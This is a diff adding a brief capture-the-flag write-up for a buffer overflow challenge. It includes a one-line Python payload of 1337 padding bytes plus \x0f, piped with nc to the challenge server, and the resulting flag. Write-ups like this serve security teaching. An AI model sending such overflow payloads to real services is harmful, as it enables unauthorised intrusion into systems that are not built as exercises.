@@ -1,0 +1,7 @@
+Again, this is a simple buffer overflow, but with a trickier input. We need to send 1337 garbage
+characters to fill up the name buffer, and another character with a value of 15. It turns out that
+the character with an ascii value of 15 is \x0f, so we just send that at as our 1338th character.
+
+    $ python -c "print 'A'*1337 + '\x0f'" | nc stuyctf.me 12347
+
+Here's your flag: stuyctf{who_said_this_is_not_winnable}
